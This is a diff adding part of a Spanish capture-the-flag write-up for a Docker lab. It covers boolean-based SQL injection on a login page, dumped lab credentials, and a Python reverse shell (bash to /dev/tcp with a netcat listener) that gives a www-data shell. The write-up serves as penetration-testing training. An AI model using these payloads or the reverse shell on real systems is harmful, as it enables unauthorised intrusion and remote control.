@@ -62,3 +62,30 @@ Antes de ir a ver la web desde el navegador, lanzamos desde consola el comando `
 Ahora vemos la raíz de la web desde el navegador, y vemos este contenido:
 
 ![image](https://github.com/user-attachments/assets/7dd79aeb-48eb-42b6-8cc4-3669027a8b84)
+
+Vemos un botón de login arriba a la derecha, que nos lleva a /login_page/index.php:
+
+![image](https://github.com/user-attachments/assets/73518c8d-ba63-4244-b660-c09ad6568c84)
+
+## EXPLOTACIÓN WEB
+
+Vemos este panel. Si probamos a meter una comilla, sale un error de MySQL, por lo que es vulnerable a inyección SQL. Podemos comprobar que no es vulnerable a una inyección de tipo union based ya que no muestra los datos de las columnas, pero si que es vulnerable a una inyección boolean based. Podemos ir enviando consultas de verdadero o falso para conseguir bases de datos, tablas, columnas y registros. Por ejemplo, para sacara el primer caracter de la primera base de datos, podríamos hacer una consulta como esta: `admin' or (select substring(schema_name,1,1) from information_schema.schemata limit 0,1)='payload'-- -`, y capturar con burpsuite la petición para enviarla al intruder y poner un payload con muchos caracteres, y fijarnos en la respuesta del servidor para ver cual tiene un contenido diferente al resto, y entonces ese esrá el primer caracter. Siguiendo este concepto podemos programar un script en python que automatice todo el proceso del dump del motor MySQL: https://github.com/4bytess/dockerlabs-scripts/tree/main/showtime/SQLi.
+
+Usando el script, conseguimos este dump:
+
+![image](https://github.com/user-attachments/assets/781aef6d-129a-426b-8ea1-13c7ea7679fb)
+
+Tenemos 3 credenciales:
+
+- lucas:123321123321
+- santiago:123456123456
+- joe:MICLAVEESINHACKEABLE
+
+Podemos probar todas en el panel de login de la página web. Las credenciales de lucas y santiago simplemente nos loguearan y nos dirán que estamos bienvenidos, pero la de joe nos lleva a la ruta /login_page/admin-panel.php, en la que hay un panel en el que podemos ejecutar comandos de python:
+
+![image](https://github.com/user-attachments/assets/2a6ab221-3ef9-492f-a929-7b5f24ce744d)
+
+Podemos escribir el comando `import os; os.system('/bin/bash -c "bash -i >& /dev/tcp/172.17.0.1/443 0>&1"')` y ponernos en escucha por el puerto 443 con netcat: `netcat -nlvp 443`, y ganamos una consola como el usuario www-data:
+
+![image](https://github.com/user-attachments/assets/d25bdcba-b747-4d9c-8b7c-233328a81c92)
+
